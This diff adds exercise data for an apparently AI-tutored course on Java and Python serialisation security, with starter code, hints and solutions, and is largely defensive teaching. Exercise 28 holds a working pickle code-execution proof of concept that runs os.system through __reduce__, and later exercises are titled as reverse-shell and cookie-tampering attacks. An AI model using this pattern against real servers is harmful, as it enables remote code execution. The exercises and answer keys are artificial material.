+              "message": "Java uses writeObject/readObject. Python pickle uses dumps/loads. JSON uses stringify/parse (JS) or dumps/loads (Python)."
+            },
+            {
+              "message": "Native serialisation (Java ObjectInputStream, Python pickle) CAN execute code. JSON methods CANNOT execute code because JSON only carries data, not class metadata."
+            },
+            {
+              "message": "Answer: Java writeObject/readObject=dangerous, pickle dumps/loads=dangerous, JSON.stringify/parse=safe, json.dumps/loads=safe. Only native serialisation methods can execute arbitrary code."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Trace the Byte Stream",
+          "description": "Given a serialised Integer with value 7, predict the last 4 bytes of the stream.",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! Given a serialised Integer with value 7, predict the last 4 bytes of the stream.",
+          "starter_code": "// A Java Integer with value 7 is serialised.\n// The full byte stream ends with the actual value.\n// What are the last 4 bytes in hex?\n\n// Hint: Java integers are 4 bytes, big-endian\n// Value 1 = 00 00 00 01\n// Value 7 = ???\n\n// TODO: Write the hex bytes",
+          "expected_output": "00 00 00 07",
+          "hints": [
+            {
+              "message": "Java stores integers as 4 bytes in big-endian format. Value 7 in decimal = 7 in hex."
+            },
+            {
+              "message": "7 in hex is just 07. With 4 bytes big-endian: 00 00 00 07"
+            },
+            {
+              "message": "Answer: 00 00 00 07. Remember: big-endian means most significant byte first."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Handle ClassNotFoundException",
+          "description": "What happens when the deserialising JVM does not have the class definition?",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! What happens when the deserialising JVM does not have the class definition?",
+          "starter_code": "import java.io.*;\n\npublic class MissingClassDemo {\n    public static void main(String[] args) {\n        try {\n            ObjectInputStream ois = new ObjectInputStream(\n                new FileInputStream(\"unknown.ser\"));\n            Object obj = ois.readObject();\n            ois.close();\n        } catch (ClassNotFoundException e) {\n            // TODO: Handle this properly\n            // What should you do? Log? Reject? Alert?\n        } catch (IOException e) {\n            // TODO: Handle IO errors\n        }\n    }\n}",
+          "expected_output": "ClassNotFoundException caught — unknown class in serialised data, rejecting",
+          "hints": [
+            {
+              "message": "ClassNotFoundException means the deserialiser cannot find the class referenced in the byte stream. This could be a version mismatch or an attack."
+            },
+            {
+              "message": "Log the error with details, reject the data, do NOT try to proceed. Never ignore ClassNotFoundException."
+            },
+            {
+              "message": "Solution: catch (ClassNotFoundException e) {\n    System.err.println(\"SECURITY: Unknown class in serialised data: \" + e.getMessage());\n    // Log to security audit\n    // Reject the data entirely\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: The transient Keyword",
+          "description": "Mark sensitive fields in an Employee class as transient to exclude them from serialisation.",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! Mark sensitive fields in an Employee class as transient to exclude them from serialisation.",
+          "starter_code": "import java.io.*;\n\npublic class Employee implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String name;\n    private String department;\n    private double salary;\n    // TODO: These fields should NOT be serialised:\n    private String password;\n    private String socialSecurityNumber;\n    private String bankAccountNumber;\n\n    // Constructor, getters, toString...\n}",
+          "expected_output": "After deserialisation: password=null, SSN=null, bankAccount=null",
+          "hints": [
+            {
+              "message": "The 'transient' keyword tells Java to skip a field during serialisation."
+            },
+            {
+              "message": "Add 'transient' before each sensitive field: private transient String password;"
+            },
+            {
+              "message": "Solution:\nprivate transient String password;\nprivate transient String socialSecurityNumber;\nprivate transient String bankAccountNumber;"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Custom writeObject / readObject",
+          "description": "Implement custom serialisation that encrypts the salary field before writing.",
+          "difficulty": "advanced",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to dig deeper into Java serialisation! Implement custom serialisation that encrypts the salary field before writing.",
+          "starter_code": "import java.io.*;\n\npublic class SecureEmployee implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private String name;\n    private transient double salary; // We handle this manually\n\n    // TODO: Implement custom writeObject\n    private void writeObject(ObjectOutputStream oos) throws IOException {\n        oos.defaultWriteObject(); // Serialise non-transient fields\n        // TODO: Write salary with simple obfuscation\n        // (In production, use real encryption!)\n    }\n\n    // TODO: Implement custom readObject\n    private void readObject(ObjectInputStream ois) \n            throws IOException, ClassNotFoundException {\n        ois.defaultReadObject();\n        // TODO: Read and de-obfuscate salary\n    }\n}",
+          "expected_output": "Custom writeObject/readObject protect the salary field",
+          "hints": [
+            {
+              "message": "defaultWriteObject() handles all normal fields. For the transient salary, you manually write/read it with your own logic."
+            },
+            {
+              "message": "In writeObject: oos.writeDouble(salary * 3.14); // simple obfuscation. In readObject: this.salary = ois.readDouble() / 3.14;"
+            },
+            {
+              "message": "Solution:\nprivate void writeObject(ObjectOutputStream oos) throws IOException {\n    oos.defaultWriteObject();\n    oos.writeDouble(salary * 3.14); // obfuscate\n}\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n    ois.defaultReadObject();\n    this.salary = ois.readDouble() / 3.14; // de-obfuscate\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Serialise with Inheritance",
+          "description": "A Manager extends Employee — what gets serialised from the parent class?",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! A Manager extends Employee — what gets serialised from the parent class?",
+          "starter_code": "import java.io.*;\n\nclass Employee implements Serializable {\n    private static final long serialVersionUID = 1L;\n    protected String name;\n    protected double salary;\n}\n\nclass Manager extends Employee {\n    private static final long serialVersionUID = 1L;\n    private String department;\n    private int teamSize;\n}\n\n// TODO: Create a Manager, serialise it, deserialise it\n// Question: Are name and salary from Employee also serialised?\n// Question: What if Employee did NOT implement Serializable?",
+          "expected_output": "Yes — name and salary from Employee are also serialised because Employee implements Serializable. If Employee did not implement Serializable, those fields would be null after deserialisation.",
+          "hints": [
+            {
+              "message": "When a parent class implements Serializable, all its fields are included in the serialised stream."
+            },
+            {
+              "message": "If the parent does NOT implement Serializable, the parent's fields are re-initialised using the no-arg constructor (and will be default values)."
+            },
+            {
+              "message": "Answer: All fields in the hierarchy that implement Serializable are included. Fields from non-Serializable parents require a no-arg constructor and will have default values after deserialisation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Detect Serialised Data in Network Traffic",
+          "description": "Write a method that checks if a byte array starts with Java serialisation magic bytes.",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! Write a method that checks if a byte array starts with Java serialisation magic bytes.",
+          "starter_code": "public class SerDetector {\n    // TODO: Write a method that returns true if the byte array\n    // starts with Java serialisation magic bytes: ac ed 00 05\n    public static boolean isJavaSerialised(byte[] data) {\n        // Check length >= 4 first!\n        // Then check bytes[0] == (byte)0xAC, etc.\n        return false; // Fix this!\n    }\n\n    public static void main(String[] args) {\n        byte[] javaData = {(byte)0xAC, (byte)0xED, 0x00, 0x05, 0x73};\n        byte[] jsonData = \"{\\\"name\\\": \\\"test\\\"}\".getBytes();\n        System.out.println(\"Java? \" + isJavaSerialised(javaData));\n        System.out.println(\"JSON? \" + isJavaSerialised(jsonData));\n    }\n}",
+          "expected_output": "Java? true\nJSON? false",
+          "hints": [
+            {
+              "message": "The first 4 bytes of Java serialised data are always: AC ED 00 05. Check data.length >= 4 first, then compare each byte."
+            },
+            {
+              "message": "Be careful with byte comparison in Java — use (byte)0xAC because Java bytes are signed (-128 to 127)."
+            },
+            {
+              "message": "Solution:\npublic static boolean isJavaSerialised(byte[] data) {\n    if (data == null || data.length < 4) return false;\n    return data[0] == (byte)0xAC && data[1] == (byte)0xED &&\n           data[2] == 0x00 && data[3] == 0x05;\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Serialise to Base64 for Transport",
+          "description": "Convert serialised bytes to Base64 string for safe text transport, then back.",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! Convert serialised bytes to Base64 string for safe text transport, then back.",
+          "starter_code": "import java.io.*;\nimport java.util.Base64;\n\npublic class Base64Serialise {\n    public static void main(String[] args) throws Exception {\n        String message = \"Hello, Serialisation!\";\n\n        // TODO: Serialise the string\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        // ... writeObject ...\n\n        // TODO: Convert to Base64\n        // String base64 = Base64.getEncoder().encodeToString(???);\n\n        // TODO: Decode Base64 and deserialise\n        // byte[] decoded = Base64.getDecoder().decode(???);\n        // ... readObject ...\n\n        System.out.println(\"Base64: \" + base64.substring(0, 30) + \"...\");\n        System.out.println(\"Restored: \" + restored);\n    }\n}",
+          "expected_output": "Base64: rO0ABXQAFUhlbGxvLCBTZXJpYW...\nRestored: Hello, Serialisation!",
+          "hints": [
+            {
+              "message": "Base64 encodes binary data as text characters (A-Z, a-z, 0-9, +, /). This lets you send serialised bytes in JSON, URLs, or cookies."
+            },
+            {
+              "message": "Encode: Base64.getEncoder().encodeToString(baos.toByteArray()). Decode: Base64.getDecoder().decode(base64)"
+            },
+            {
+              "message": "Solution:\nObjectOutputStream oos = new ObjectOutputStream(baos);\noos.writeObject(message); oos.close();\nString base64 = Base64.getEncoder().encodeToString(baos.toByteArray());\nbyte[] decoded = Base64.getDecoder().decode(base64);\nObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded));\nString restored = (String) ois.readObject();"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Externalizable vs Serializable",
+          "description": "Implement Externalizable for full control over the serialisation format.",
+          "difficulty": "advanced",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to dig deeper into Java serialisation! Implement Externalizable for full control over the serialisation format.",
+          "starter_code": "import java.io.*;\n\npublic class Config implements Externalizable {\n    private String appName;\n    private int maxUsers;\n    private boolean debugMode;\n\n    public Config() {} // Required for Externalizable!\n\n    public Config(String name, int max, boolean debug) {\n        this.appName = name;\n        this.maxUsers = max;\n        this.debugMode = debug;\n    }\n\n    // TODO: Implement writeExternal\n    @Override\n    public void writeExternal(ObjectOutput out) throws IOException {\n        // Write each field explicitly\n    }\n\n    // TODO: Implement readExternal\n    @Override\n    public void readExternal(ObjectInput in) throws IOException {\n        // Read each field in the same order\n    }\n}",
+          "expected_output": "Externalizable gives you full control — you choose exactly what to write and how",
+          "hints": [
+            {
+              "message": "Externalizable requires you to manually write and read each field. Unlike Serializable, nothing is automatic."
+            },
+            {
+              "message": "writeExternal: out.writeUTF(appName); out.writeInt(maxUsers); out.writeBoolean(debugMode); readExternal reads in the same order."
+            },
+            {
+              "message": "Solution:\npublic void writeExternal(ObjectOutput out) throws IOException {\n    out.writeUTF(appName);\n    out.writeInt(maxUsers);\n    out.writeBoolean(debugMode);\n}\npublic void readExternal(ObjectInput in) throws IOException {\n    this.appName = in.readUTF();\n    this.maxUsers = in.readInt();\n    this.debugMode = in.readBoolean();\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: Prevent Cloning via Serialisation",
+          "description": "An attacker can clone a singleton by serialising and deserialising it. Prevent this.",
+          "difficulty": "advanced",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to dig deeper into Java serialisation! An attacker can clone a singleton by serialising and deserialising it. Prevent this.",
+          "starter_code": "import java.io.*;\n\npublic class DatabaseConnection implements Serializable {\n    private static final long serialVersionUID = 1L;\n    private static DatabaseConnection instance;\n    private String connectionString;\n\n    private DatabaseConnection(String conn) {\n        this.connectionString = conn;\n    }\n\n    public static DatabaseConnection getInstance() {\n        if (instance == null) {\n            instance = new DatabaseConnection(\"jdbc:mysql://localhost/db\");\n        }\n        return instance;\n    }\n\n    // TODO: Add a method to prevent deserialisation from creating\n    // a second instance. Hint: readResolve()\n}",
+          "expected_output": "readResolve() returns the existing singleton instance instead of the deserialised copy",
+          "hints": [
+            {
+              "message": "Java calls readResolve() after readObject(). If it exists, the returned object replaces the deserialised one."
+            },
+            {
+              "message": "Add: private Object readResolve() throws ObjectStreamException { return getInstance(); }"
+            },
+            {
+              "message": "Solution:\nprivate Object readResolve() throws ObjectStreamException {\n    return getInstance(); // Always return the singleton\n}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Measure Serialised Object Size",
+          "description": "Compare the byte size of serialised objects with different field types.",
+          "difficulty": "intermediate",
+          "category": "Java Serialisation Deep Dive",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to dig deeper into Java serialisation! Compare the byte size of serialised objects with different field types.",
+          "starter_code": "import java.io.*;\n\npublic class SizeComparison {\n    static int getSerializedSize(Serializable obj) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        new ObjectOutputStream(baos).writeObject(obj);\n        return baos.toByteArray().length;\n    }\n\n    public static void main(String[] args) throws Exception {\n        // TODO: Compare sizes of different objects\n        System.out.println(\"Integer 42: \" + getSerializedSize(42) + \" bytes\");\n        System.out.println(\"String 'Hello': \" + getSerializedSize(\"Hello\") + \" bytes\");\n        // TODO: Try a String with 1000 characters\n        // TODO: Try an ArrayList with 100 integers\n        // TODO: Try a HashMap with 10 entries\n        // Which is smallest? Which is largest?\n    }\n}",
+          "expected_output": "Integer 42: ~81 bytes\nString 'Hello': ~12 bytes\nLong string: ~1010+ bytes\nArrayList(100): ~600+ bytes",
+          "hints": [
+            {
+              "message": "Java serialisation adds significant overhead for metadata (class names, version IDs). A simple Integer takes about 81 bytes!"
+            },
+            {
+              "message": "Use StringBuilder to create a 1000-char string. Use IntStream.range(0,100).boxed().collect(Collectors.toCollection(ArrayList::new)) for the list."
+            },
+            {
+              "message": "Key insight: Java serialisation overhead is significant. An Integer (4 bytes of data) takes ~81 bytes serialised. JSON would represent it as just '42' (2 bytes). This is another reason to prefer JSON for network communication."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Understand __reduce__ Return Value",
+          "description": "Write a __reduce__ method that tells pickle how to recreate a Colour object.",
+          "difficulty": "intermediate",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Write a __reduce__ method that tells pickle how to recreate a Colour object.",
+          "starter_code": "import pickle\n\nclass Colour:\n    def __init__(self, r, g, b):\n        self.r = r\n        self.g = g\n        self.b = b\n\n    def __reduce__(self):\n        # TODO: Return (callable, args) tuple\n        # callable should be Colour\n        # args should be (self.r, self.g, self.b)\n        pass\n\n    def __repr__(self):\n        return f'Colour({self.r}, {self.g}, {self.b})'\n\nc = Colour(255, 128, 0)\ndata = pickle.dumps(c)\nrestored = pickle.loads(data)\nprint(f'Original: {c}')\nprint(f'Restored: {restored}')",
+          "expected_output": "Original: Colour(255, 128, 0)\nRestored: Colour(255, 128, 0)",
+          "hints": [
+            {
+              "message": "__reduce__ must return a tuple: (callable, args). Pickle will call callable(*args) to recreate the object."
+            },
+            {
+              "message": "return (Colour, (self.r, self.g, self.b))"
+            },
+            {
+              "message": "Solution:\ndef __reduce__(self):\n    return (Colour, (self.r, self.g, self.b))"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Inspect Pickle Opcodes",
+          "description": "Use pickletools to disassemble and understand what pickle actually stores.",
+          "difficulty": "intermediate",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Use pickletools to disassemble and understand what pickle actually stores.",
+          "starter_code": "import pickle\nimport pickletools\n\ndata = {'name': 'Alice', 'score': 42}\nserialised = pickle.dumps(data)\n\n# TODO: Use pickletools.dis() to see the opcodes\n# pickletools.dis(serialised)\n\n# TODO: What opcode starts the stream?\n# TODO: What opcode marks the end?\n# TODO: Can you see where 'Alice' and 42 are stored?",
+          "expected_output": "pickletools.dis() shows opcodes like PROTO, MARK, SHORT_BINUNICODE, LONG1, etc.",
+          "hints": [
+            {
+              "message": "pickletools.dis(serialised) prints a human-readable disassembly of the pickle byte stream."
+            },
+            {
+              "message": "The stream starts with PROTO (protocol version) and ends with STOP. String 'Alice' appears as SHORT_BINUNICODE, 42 as LONG1 or BININT1."
+            },
+            {
+              "message": "Solution:\npickletools.dis(serialised)\n# Output shows each opcode, its argument, and what it does.\n# This helps you understand exactly what pickle stores."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Pickle Protocol Versions",
+          "description": "Compare different pickle protocol versions and their byte sizes.",
+          "difficulty": "beginner",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Compare different pickle protocol versions and their byte sizes.",
+          "starter_code": "import pickle\n\ndata = {'username': 'bob', 'scores': [10, 20, 30]}\n\n# TODO: Serialise with different protocol versions\n# for protocol in range(6):  # Protocols 0-5\n#     serialised = pickle.dumps(data, protocol=protocol)\n#     print(f'Protocol {protocol}: {len(serialised)} bytes')\n\n# TODO: Which protocol produces the smallest output?\n# TODO: Which protocol is human-readable (text-based)?",
+          "expected_output": "Protocol 0: ~80 bytes (text, human-readable)\nProtocol 5: ~50 bytes (binary, most compact)",
+          "hints": [
+            {
+              "message": "pickle.dumps() accepts a 'protocol' parameter. Protocol 0 is text-based (you can read it). Higher protocols are binary and more compact."
+            },
+            {
+              "message": "for protocol in range(6): print(f'Protocol {protocol}: {len(pickle.dumps(data, protocol=protocol))} bytes')"
+            },
+            {
+              "message": "Protocol 0 is the oldest and human-readable (ASCII). Protocol 5 (Python 3.8+) is the most efficient. Default is usually protocol 5. For debugging, protocol 0 is useful."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Safe Socket Communication with JSON",
+          "description": "Replace pickle with JSON for safe client-server communication.",
+          "difficulty": "intermediate",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Replace pickle with JSON for safe client-server communication.",
+          "starter_code": "import json\nimport socket\n\n# === SERVER SIDE ===\ndef handle_client(client_socket):\n    raw = client_socket.recv(4096)\n    # TODO: Use json.loads() instead of pickle.loads()\n    # data = ???\n    # Validate the data\n    # if 'message' not in data:\n    #     raise ValueError('Missing message field')\n    print(f'Received: {data[\"message\"]}')\n    client_socket.close()\n\n# === CLIENT SIDE ===\ndef send_message(msg):\n    data = {'message': msg, 'sender': 'client1'}\n    # TODO: Use json.dumps() instead of pickle.dumps()\n    # payload = ???.encode('utf-8')\n    # soc.send(payload)",
+          "expected_output": "Server receives JSON safely — no code execution possible",
+          "hints": [
+            {
+              "message": "Replace pickle.dumps(data) with json.dumps(data).encode('utf-8') and pickle.loads(raw) with json.loads(raw.decode('utf-8'))."
+            },
+            {
+              "message": "JSON cannot execute code. Even if the client sends malicious data, json.loads() only produces dicts, lists, strings, numbers, booleans, and None."
+            },
+            {
+              "message": "Solution:\n# Server: data = json.loads(raw.decode('utf-8'))\n# Client: payload = json.dumps(data).encode('utf-8')\n# Always validate: if 'message' not in data: raise ValueError(...)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Pickle Bomb: Resource Exhaustion",
+          "description": "Explain how a pickle bomb can crash a server by exhausting memory.",
+          "difficulty": "advanced",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's understand Python pickle internals! Explain how a pickle bomb can crash a server by exhausting memory.",
+          "starter_code": "import pickle\n\n# A pickle bomb creates a HUGE object from tiny serialised data\n# This is like a zip bomb but for pickle\n\n# Example: a tiny payload that creates a massive list\n# (DO NOT run this without memory limits!)\n\n# TODO: Explain why this is dangerous:\n# 1. The serialised data might be only a few hundred bytes\n# 2. But the deserialised object could be gigabytes\n# 3. This crashes the server by exhausting RAM\n\n# TODO: How would you defend against this?\n# Hint: Think about limits on:\n# - Maximum deserialised object size\n# - Maximum recursion depth\n# - Timeout for deserialisation",
+          "expected_output": "Defence: set size limits, recursion depth limits, timeouts, and memory quotas before deserialising",
+          "hints": [
+            {
+              "message": "A pickle bomb is like a zip bomb — small compressed data that expands to fill all memory. The server runs out of RAM and crashes."
+            },
+            {
+              "message": "Defences: (1) Limit the size of incoming data before deserialising. (2) Set memory quotas using resource limits. (3) Use timeouts to kill long-running deserialisation."
+            },
+            {
+              "message": "Full defence:\n1. Check len(raw_data) < MAX_SIZE before deserialising\n2. import resource; resource.setrlimit(resource.RLIMIT_AS, (MAX_MEMORY, MAX_MEMORY))\n3. Use signal.alarm(timeout) to kill after N seconds\n4. Better yet: use JSON instead of pickle!"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: YAML safe_load vs load",
+          "description": "Demonstrate why yaml.safe_load() is safe but yaml.load() is dangerous — just like pickle.",
+          "difficulty": "intermediate",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Demonstrate why yaml.safe_load() is safe but yaml.load() is dangerous — just like pickle.",
+          "starter_code": "import yaml\n\n# yaml.load() is DANGEROUS — like pickle.loads()\n# yaml.safe_load() is SAFE — like json.loads()\n\ndata = \"\"\"\nname: Alice\nscore: 42\nitems:\n  - sword\n  - shield\n\"\"\"\n\n# TODO: Parse with safe_load (SAFE)\n# result = yaml.safe_load(data)\n# print(result)\n\n# The dangerous version yaml.load(data, Loader=yaml.FullLoader)\n# can execute arbitrary Python code via special YAML tags!\n\n# TODO: Explain why safe_load is like json.loads\n# and yaml.load is like pickle.loads",
+          "expected_output": "safe_load only creates basic Python types (dict, list, str, int). load can instantiate arbitrary Python objects — same danger as pickle.",
+          "hints": [
+            {
+              "message": "yaml.safe_load() only creates basic types: dict, list, str, int, float, bool, None. It cannot create arbitrary objects."
+            },
+            {
+              "message": "yaml.load() with FullLoader can instantiate ANY Python class, just like pickle. That means RCE if the YAML comes from untrusted input."
+            },
+            {
+              "message": "Rule: ALWAYS use yaml.safe_load() for untrusted data. NEVER use yaml.load(data, Loader=yaml.FullLoader) or yaml.load(data, Loader=yaml.UnsafeLoader) on untrusted data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Build a Codec Module",
+          "description": "Create the encoding/decoding module used in client-server pickle communication.",
+          "difficulty": "intermediate",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's understand Python pickle internals! Create the encoding/decoding module used in client-server pickle communication.",
+          "starter_code": "# codec.py — shared between client and server\n# Provides consistent encoding and decoding\n\n# TODO: Implement myEncode that converts string to bytes\ndef myEncode(data):\n    # Convert string to UTF-8 bytes\n    pass\n\n# TODO: Implement myDecode that converts bytes back to string\ndef myDecode(data):\n    # Convert UTF-8 bytes back to string\n    pass\n\n# Test\noriginal = 'Hello, Server!'\nencoded = myEncode(original)\ndecoded = myDecode(encoded)\nprint(f'Original: {original}')\nprint(f'Encoded: {encoded}')\nprint(f'Decoded: {decoded}')\nprint(f'Match: {original == decoded}')",
+          "expected_output": "Original: Hello, Server!\nEncoded: b'Hello, Server!'\nDecoded: Hello, Server!\nMatch: True",
+          "hints": [
+            {
+              "message": "myEncode converts a string to bytes. In Python, use the .encode() method on strings."
+            },
+            {
+              "message": "def myEncode(data): return data.encode('utf-8')\ndef myDecode(data): return data.decode('utf-8')"
+            },
+            {
+              "message": "Solution:\ndef myEncode(data):\n    return data.encode('utf-8')\n\ndef myDecode(data):\n    return data.decode('utf-8')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Trace the Pickle Attack Step by Step",
+          "description": "Walk through exactly what happens when pickle.loads() processes a malicious payload.",
+          "difficulty": "advanced",
+          "category": "Python Pickle Mechanics",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's understand Python pickle internals! Walk through exactly what happens when pickle.loads() processes a malicious payload.",
+          "starter_code": "# Trace each step of the attack:\n\nimport pickle, os\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('echo PWNED',))\n\npayload = pickle.dumps(Exploit())\n\n# TODO: Describe what happens at each step:\n# Step 1: pickle.dumps(Exploit()) calls ???\n# Step 2: __reduce__ returns ???\n# Step 3: The tuple is encoded into pickle opcodes: ???\n# Step 4: Server receives payload and calls pickle.loads(payload)\n# Step 5: pickle.loads() reads opcodes, finds ???\n# Step 6: pickle calls ??? with arguments ???\n# Step 7: The shell command ??? executes on the server\n# Step 8: os.system returns ???, which becomes the deserialised object",
+          "expected_output": "Step 1: calls __reduce__()\nStep 2: returns (os.system, ('echo PWNED',))\nStep 6: calls os.system('echo PWNED')\nStep 7: 'echo PWNED' runs on server\nStep 8: returns 0 (exit code)",
+          "hints": [
+            {
+              "message": "Start from pickle.dumps(): it calls the object's __reduce__() method to get the (callable, args) tuple."
+            },
+            {
+              "message": "The tuple (os.system, ('echo PWNED',)) is encoded as pickle opcodes: GLOBAL 'posix system', then the args tuple, then REDUCE."
+            },
+            {
+              "message": "Full trace:\n1. dumps() calls Exploit().__reduce__()\n2. Returns (os.system, ('echo PWNED',))\n3. Encoded as GLOBAL 'posix' 'system' + TUPLE('echo PWNED') + REDUCE\n4. Server calls pickle.loads(payload)\n5. Reads GLOBAL: imports posix.system\n6. Reads REDUCE: calls os.system('echo PWNED')\n7. Shell executes 'echo PWNED' on server\n8. os.system returns 0, which is the 'deserialised object'"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Privilege Escalation via Byte Tampering",
+          "description": "Change a user's role from 'user' to 'admin' by modifying serialised bytes.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Change a user's role from 'user' to 'admin' by modifying serialised bytes.",
+          "starter_code": "// Privilege Escalation via Byte Tampering\n// Change a user's role from 'user' to 'admin' by modifying serialised bytes.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Privilege Escalation via Byte Tampering",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Craft a Pickle Reverse Shell",
+          "description": "Create a pickle payload that opens a reverse shell connection (educational only).",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Create a pickle payload that opens a reverse shell connection (educational only).",
+          "starter_code": "// Craft a Pickle Reverse Shell\n// Create a pickle payload that opens a reverse shell connection (educational only).\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Craft a Pickle Reverse Shell",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Cookie Tampering Attack",
+          "description": "A web app stores user role in a serialised cookie. Modify it to gain admin access.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. A web app stores user role in a serialised cookie. Modify it to gain admin access.",
+          "starter_code": "// Cookie Tampering Attack\n// A web app stores user role in a serialised cookie. Modify it to gain admin access.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Cookie Tampering Attack",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Predict the Damage: Root vs User",
+          "description": "Given a pickle RCE on a server, list what an attacker can do as root vs limited user.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Given a pickle RCE on a server, list what an attacker can do as root vs limited user.",
